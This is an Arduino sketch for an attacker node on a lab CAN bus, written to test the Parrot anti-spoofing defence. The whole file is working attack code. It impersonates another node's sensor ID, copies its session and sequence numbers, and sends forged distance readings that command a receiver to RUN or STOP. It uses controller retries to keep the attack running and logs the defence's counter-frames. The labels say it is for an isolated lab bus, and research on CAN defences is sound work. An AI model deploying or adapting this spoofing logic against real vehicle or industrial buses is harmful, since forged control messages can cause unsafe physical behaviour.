// C = experimental spoofing node (Eve in Dagan-Wool Parrot).
// LAB USE ONLY. It impersonates B's SENSOR_ID on the isolated three-node bus.
#include <SPI.h>
#include <mcp2515_can.h>
#include "Protocol.h"

const uint8_t CAN_CS = 9;
const uint8_t CAN_CLOCK = MCP_16MHz;
const uint32_t CAN_SPEED = CAN_500KBPS;
const uint32_t SERIAL_SPEED = 115200;
const uint32_t ATTACK_DELAY_MS = 400;
const uint32_t ATTACK_PERIOD_MS = 1000;
const uint16_t FORGED_RUN_CM = 250;
const uint16_t FORGED_STOP_CM = 25;

mcp2515_can can(CAN_CS);

struct AttackCounters {
  uint32_t rx, targetFrames, defensiveZero, queued, txOk, txFail;
  uint32_t bad, unrelated, overflow, busOff, recovered;
} counts = {};

bool ready = false;
bool attackEnabled = true;
bool haveTarget = false;
bool haveLegitimateSequence = false;
bool txBusy = false;
bool busOffNow = false;
uint32_t lastInit = 0, lastDiag = 0, lastStats = 0, nextAttackAt = 0;
uint16_t targetSession = 0, lastLegitimateSeq = 0, nextSpoofSeq = 0;
uint16_t forgedDistanceCm = FORGED_RUN_CM;
uint16_t queuedSeq = 0, queuedCm = 0;
uint8_t previousErrorState = 0xff;

uint8_t regRead(uint8_t address) {
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  digitalWrite(CAN_CS, LOW);
  SPI.transfer(0x03); SPI.transfer(address);
  const uint8_t value = SPI.transfer(0);
  digitalWrite(CAN_CS, HIGH);
  SPI.endTransaction();
  return value;
}

void regModify(uint8_t address, uint8_t mask, uint8_t value) {
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  digitalWrite(CAN_CS, LOW);
  SPI.transfer(0x05); SPI.transfer(address); SPI.transfer(mask); SPI.transfer(value);
  digitalWrite(CAN_CS, HIGH);
  SPI.endTransaction();
}

void event(const __FlashStringHelper *message) {
  Serial.print(millis()); Serial.print(F(" C ")); Serial.println(message);
}

void printRegisters() {
  Serial.print(F("EFLG=0x")); Serial.print(regRead(0x2d), HEX);
  Serial.print(F(" TEC=")); Serial.print(regRead(0x1c));
  Serial.print(F(" REC=")); Serial.print(regRead(0x1d));
  Serial.print(F(" TX0CTRL=0x")); Serial.println(regRead(0x30), HEX);
}

void printHexByte(uint8_t value) {
  if (value < 0x10) Serial.print('0');
  Serial.print(value, HEX);
}

void printStats() {
  Serial.print(F("STATS C rx=")); Serial.print(counts.rx);
  Serial.print(F(" target=")); Serial.print(counts.targetFrames);
  Serial.print(F(" dmessage_zero=")); Serial.print(counts.defensiveZero);
  Serial.print(F(" queued=")); Serial.print(counts.queued);
  Serial.print(F(" tx_ok=")); Serial.print(counts.txOk);
  Serial.print(F(" tx_fail=")); Serial.print(counts.txFail);
  Serial.print(F(" bad=")); Serial.print(counts.bad);
  Serial.print(F(" unrelated=")); Serial.print(counts.unrelated);
  Serial.print(F(" overflow=")); Serial.print(counts.overflow);
  Serial.print(F(" bus_off=")); Serial.print(counts.busOff);
  Serial.print(F(" recovered=")); Serial.print(counts.recovered);
  Serial.print(F(" attack=")); Serial.print(attackEnabled ? F("ON") : F("OFF"));
  Serial.print(F(" target_session=")); Serial.print(targetSession);
  Serial.print(F(" next_spoof_seq=")); Serial.println(nextSpoofSeq);
  if (ready) printRegisters();
}

bool initializeCan() {
  pinMode(10, OUTPUT); digitalWrite(10, HIGH); // keep UNO as SPI master
  pinMode(4, OUTPUT); digitalWrite(4, HIGH);   // deselect shield microSD
  if (can.begin(CAN_SPEED, CAN_CLOCK) != CAN_OK) {
    event(F("CAN_INIT_FAIL: check CS, oscillator and shield seating"));
    return false;
  }
  if (can.setMode(MODE_NORMAL) != CAN_OK) return false;
  if (can.init_Mask(0, 0, 0) != CAN_OK || can.init_Mask(1, 0, 0) != CAN_OK)
    return false;
  for (uint8_t i = 0; i < 6; ++i)
    if (can.init_Filt(i, 0, 0) != CAN_OK) return false;
  // RXM=00 and BUKT enabled, matching A/B. TX0 is the only software buffer.
  regModify(0x60, 0x64, 0x04);
  regModify(0x70, 0x60, 0);
  regModify(0x2c, 0x04, 0);
  txBusy = false;
  busOffNow = false;
  previousErrorState = 0xff;
  event(F("CAN_READY 500k standard DLC8; normal retransmission enabled"));
  return true;
}

void printSpoof(const __FlashStringHelper *stage, uint16_t seq, uint16_t cm) {
  Serial.print(millis()); Serial.print(F(" C SPOOF "));
  Serial.print(stage);
  Serial.print(F(" id=0x120 dlc=8 seq=")); Serial.print(seq);
  Serial.print(F(" cm=")); Serial.print(cm);
  Serial.print(F(" session=")); Serial.print(targetSession);
  Serial.print(F(" data="));
  uint8_t data[Lab::DLC];
  Lab::encodeSensor(data, seq, cm, targetSession);
  for (uint8_t i = 0; i < Lab::DLC; ++i) {
    if (i) Serial.print(' ');
    printHexByte(data[i]);
  }
  Serial.print('\n');
}

bool queueSpoof(uint32_t now) {
  if (!ready || !attackEnabled || !haveTarget || txBusy || busOffNow) return false;
  uint8_t data[Lab::DLC];
  Lab::encodeSensor(data, nextSpoofSeq, forgedDistanceCm, targetSession);
  regModify(0x2c, 0x04, 0);
  // Do not enable one-shot mode and do not impose a TX deadline. Parrot relies
  // on the attacker's standards-compliant controller automatically retrying a
  // frame after a collision/error.
  if (can.trySendMsgBuf(Lab::SENSOR_ID, 0, 0, Lab::DLC, data, 0) != CAN_OK) {
    ++counts.txFail;
    event(F("SPOOF_QUEUE_FAILED"));
    return false;
  }
  queuedSeq = nextSpoofSeq++;
  queuedCm = forgedDistanceCm;
  txBusy = true;
  ++counts.queued;
  printSpoof(F("QUEUED"), queuedSeq, queuedCm);
  nextAttackAt = now + ATTACK_PERIOD_MS;
  return true;
}

void serviceTx() {
  if (!txBusy) return;
  const uint8_t ctrl = regRead(0x30);
  if (ctrl & 0x08) return; // TXREQ: MCP2515 still sending/retrying
  const bool ok = (regRead(0x2c) & 0x04) && !(ctrl & 0x50);
  if (ok) {
    ++counts.txOk;
    printSpoof(F("TX_OK"), queuedSeq, queuedCm);
  } else {
    ++counts.txFail;
    printSpoof(F("TX_ERROR_OR_ABORT"), queuedSeq, queuedCm);
  }
  regModify(0x2c, 0x04, 0);
  txBusy = false;
}

void synchronizeTarget(const uint8_t *data, uint32_t now) {
  const uint16_t session = Lab::u16(data + 6);
  const uint16_t sequence = Lab::u16(data + 1);
  const bool newSession = !haveTarget || session != targetSession;
  if (newSession) {
    targetSession = session;
    lastLegitimateSeq = sequence;
    nextSpoofSeq = uint16_t(sequence + 1U);
    haveTarget = haveLegitimateSequence = true;
    nextAttackAt = now + ATTACK_DELAY_MS;
    Serial.print(millis()); Serial.print(F(" C TARGET_SYNC session="));
    Serial.print(targetSession); Serial.print(F(" observed_seq="));
    Serial.print(sequence); Serial.print(F(" first_spoof_seq="));
    Serial.println(nextSpoofSeq);
    return;
  }

  const Lab::Order legitimateOrder =
    Lab::order(haveLegitimateSequence, lastLegitimateSeq, sequence);
  if (legitimateOrder == Lab::FORWARD) {
    lastLegitimateSeq = sequence;
    haveLegitimateSequence = true;
  }
  // Never move the forged stream backwards if A has already accepted a later
  // spoofed sequence. Only jump forward when legitimate B overtakes it.
  const uint16_t candidate = uint16_t(sequence + 1U);
  if (Lab::order(true, uint16_t(nextSpoofSeq - 1U), candidate) == Lab::FORWARD)
    nextSpoofSeq = candidate;
}

void receiveFrames(uint32_t now) {
  for (uint8_t n = 0; n < 8 && can.checkReceive() == CAN_MSGAVAIL; ++n) {
    uint8_t len = 0, data[8] = {};
    if (can.readMsgBuf(&len, data) != CAN_OK) { ++counts.bad; continue; }
    const uint32_t id = can.getCanId();
    const bool ext = can.isExtendedFrame(), rtr = can.isRemoteRequest();
    ++counts.rx;
    if (ext || rtr) { ++counts.bad; continue; }
    if (id != Lab::SENSOR_ID) { ++counts.unrelated; continue; }
    if (len != Lab::DLC) { ++counts.bad; continue; }
    if (Lab::allZero(data)) {
      ++counts.defensiveZero;
      event(F("ALL_ZERO_0x120_RX: possible Parrot Dmessage"));
      continue;
    }
    if (!Lab::validSensor(data)) { ++counts.bad; continue; }
    ++counts.targetFrames;
    synchronizeTarget(data, now);
  }
}

void diagnostics(uint32_t now) {
  if (!Lab::elapsed(now, lastDiag, 1)) return;
  lastDiag = now;
  const uint8_t flags = regRead(0x2d);
  const uint8_t state = flags & 0x3f;
  if (state != previousErrorState) {
    previousErrorState = state;
    event(F("CAN_STATE_CHANGED"));
    printRegisters();
    if (flags & 0x20) event(F("CAN_BUS_OFF"));
    else if (flags & 0x18) event(F("CAN_ERROR_PASSIVE"));
    else if (flags & 0x07) event(F("CAN_ERROR_WARNING"));
    else event(F("CAN_ERROR_ACTIVE"));
  }
  const bool off = (flags & 0x20) != 0;
  if (off && !busOffNow) {
    busOffNow = true;
    ++counts.busOff;
    event(F("ATTACK_CONTAINED_AT_CONTROLLER: TXBO observed"));
  } else if (!off && busOffNow) {
    busOffNow = false;
    ++counts.recovered;
    nextAttackAt = now + ATTACK_PERIOD_MS;
    event(F("CONTROLLER_RECOVERED_FROM_BUS_OFF: attack may resume"));
  }
  if (flags & 0xc0) {
    ++counts.overflow;
    event(F("RX_OVERFLOW"));
    regModify(0x2d, 0xc0, 0);
  }
}

void help() {
  event(F("h help | s stats | a attack on/off | u forge RUN | t forge STOP | r reset CAN"));
}

void commands() {
  if (!Serial.available()) return;
  const char command = Serial.read();
  if (command == 'h') help();
  else if (command == 's') printStats();
  else if (command == 'a') {
    attackEnabled = !attackEnabled;
    event(attackEnabled ? F("ATTACK_ENABLED") : F("ATTACK_DISABLED"));
    if (attackEnabled && haveTarget) nextAttackAt = millis() + ATTACK_DELAY_MS;
  } else if (command == 'u') {
    forgedDistanceCm = FORGED_RUN_CM;
    event(F("FORGED_DISTANCE=250 -> request RUN"));
  } else if (command == 't') {
    forgedDistanceCm = FORGED_STOP_CM;
    event(F("FORGED_DISTANCE=25 -> request STOP"));
  } else if (command == 'r') {
    attackEnabled = false;
    event(F("MANUAL_CAN_RESET: evidence counters in MCP2515 will be cleared"));
    ready = initializeCan();
    lastInit = millis();
  }
}

void setup() {
  Serial.begin(SERIAL_SPEED);
  event(F("CAN LAB C ATTACKER: authorized isolated-bus experiment only"));
  event(F("Parrot OFF: impersonating B with legal non-zero 0x120 frames"));
  ready = initializeCan();
  lastInit = millis();
  help();
}

void loop() {
  const uint32_t now = millis();
  commands();
  if (!ready) {
    if (Lab::elapsed(now, lastInit, 2000)) {
      lastInit = now;
      ready = initializeCan();
    }
    return;
  }
  diagnostics(now);
  serviceTx();
  receiveFrames(now);
  if (attackEnabled && haveTarget && !txBusy && !busOffNow &&
      Lab::deadlineReached(now, nextAttackAt))
    queueSpoof(now);
  if (Lab::elapsed(now, lastStats, 5000)) {
    lastStats = now;
    printStats();
  }
}
